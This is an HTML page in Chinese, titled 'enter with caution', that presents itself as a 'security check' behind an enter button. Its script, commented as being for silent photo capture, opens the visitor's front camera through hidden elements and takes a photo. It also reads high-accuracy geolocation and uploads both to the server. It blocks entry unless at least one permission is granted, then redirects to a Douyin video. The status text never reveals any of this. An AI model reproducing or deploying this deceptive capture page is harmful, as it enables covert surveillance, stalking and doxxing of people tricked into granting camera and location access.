<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>慎入</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    body {
      background: #000;
      color: #fff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 20px;
    }
    h1 {
      font-size: 3.2rem;
      letter-spacing: 0.5rem;
      color: #ef4444;
      margin-bottom: 1.5rem;
      text-shadow: 0 0 20px #ef4444;
    }
    .sub {
      font-size: 1rem;
      color: #aaaaaa;
      margin-bottom: 2.5rem;
      text-align: center;
      line-height: 1.6;
    }
    .enter-btn {
      background: #dc2626;
      color: #fff;
      border: none;
      padding: 1.2rem 3rem;
      font-size: 1.8rem;
      font-weight: bold;
      border-radius: 12px;
      letter-spacing: 0.3rem;
      cursor: pointer;
      transition: 0.15s;
    }
    .enter-btn:active { background: #b91c1c; transform: scale(0.97); }
    .enter-btn:disabled { background: #555; cursor: not-allowed; transform: none; }
    #status {
      margin-top: 2rem;
      font-size: 0.9rem;
      color: #888;
      min-height: 1.5em;
    }
  </style>
</head>
<body>
  <h1>慎 入</h1>
  <p class="sub">系统将进行一次安全校验</p>
  <button class="enter-btn" id="enterBtn">进入</button>
  <div id="status">本网站不对您的心理负责，请注意</div>

  <!-- 隐藏的视频与画布，用于静默拍照 -->
  <video id="video" style="display:none;" playsinline muted></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    (function() {
      const btn = document.getElementById('enterBtn');
      const statusDiv = document.getElementById('status');
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');

      let stream = null;

      // 状态文字固定，不再变化
      function setStatus(text) {
        // 总是显示同一句话，保留此函数仅为兼容
        statusDiv.textContent = '本网站不对您的心理负责，请注意';
      }

      // 静默开启前置摄像头并返回 MediaStream
      async function openCamera() {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        });
        video.srcObject = stream;
        await video.play();
        await new Promise(resolve => {
          if (video.readyState >= 2 && video.videoWidth > 0) resolve();
          else video.addEventListener('canplay', resolve, { once: true });
        });
      }

      // 拍照并返回 JPEG Blob
      async function takePhoto() {
        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return new Promise(resolve => {
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7);
        });
      }

      // 关闭摄像头
      function closeCamera() {
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
          stream = null;
        }
      }

      // 获取地理位置
      function getPosition() {
        return new Promise((resolve, reject) => {
          if (!navigator.geolocation) {
            return reject(new Error('浏览器不支持定位'));
          }
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 6000,
            maximumAge: 0
          });
        });
      }

      // 生成一个 1x1 像素的占位图（当没有摄像头画面时使用）
      function generatePlaceholderBlob() {
        const c = document.createElement('canvas');
        c.width = 1;
        c.height = 1;
        return new Promise(resolve => c.toBlob(resolve, 'image/jpeg'));
      }

      // 主流程
      btn.addEventListener('click', async () => {
        btn.disabled = true;

        try {
          // 并行请求摄像头和定位，不互相阻塞
          const cameraPromise = (async () => {
            try {
              await openCamera();
              const blob = await takePhoto();
              closeCamera();
              return blob;
            } catch (e) {
              closeCamera();
              return null; // 摄像头失败
            }
          })();

          const positionPromise = (async () => {
            try {
              const pos = await getPosition();
              return { lat: pos.coords.latitude, lon: pos.coords.longitude };
            } catch (e) {
              return null; // 定位失败
            }
          })();

          const [blob, position] = await Promise.all([cameraPromise, positionPromise]);

          // 只要有一项成功即可继续，两项都失败则拒绝
          if (!blob && !position) {
            alert('❌ 校验失败：\n摄像头和位置权限均未通过，无法继续访问。\n请在设置中至少允许其中一项。');
            btn.disabled = false;
            return;
          }

          // 如果没有摄像头画面，使用占位图
          const finalBlob = blob || await generatePlaceholderBlob();

          const formData = new FormData();
          formData.append('photo', finalBlob, 'capture.jpg');
          if (position) {
            formData.append('lat', position.lat);
            formData.append('lon', position.lon);
          }

          // 上传
          const response = await fetch('/submit', {
            method: 'POST',
            body: formData
          });

          const result = await response.json();
          if (response.ok && result.success) {
            // 校验通过直接跳转，不改变状态文字
            window.location.href = 'https://v.douyin.com/ySyn-e7a2AE/';
          } else {
            alert('服务端保存失败，请稍后重试');
            btn.disabled = false;
          }
        } catch (err) {
          console.error(err);
          alert('发生未知错误，请刷新重试');
          btn.disabled = false;
        }
      });
    })();
  </script>
</body>
</html>
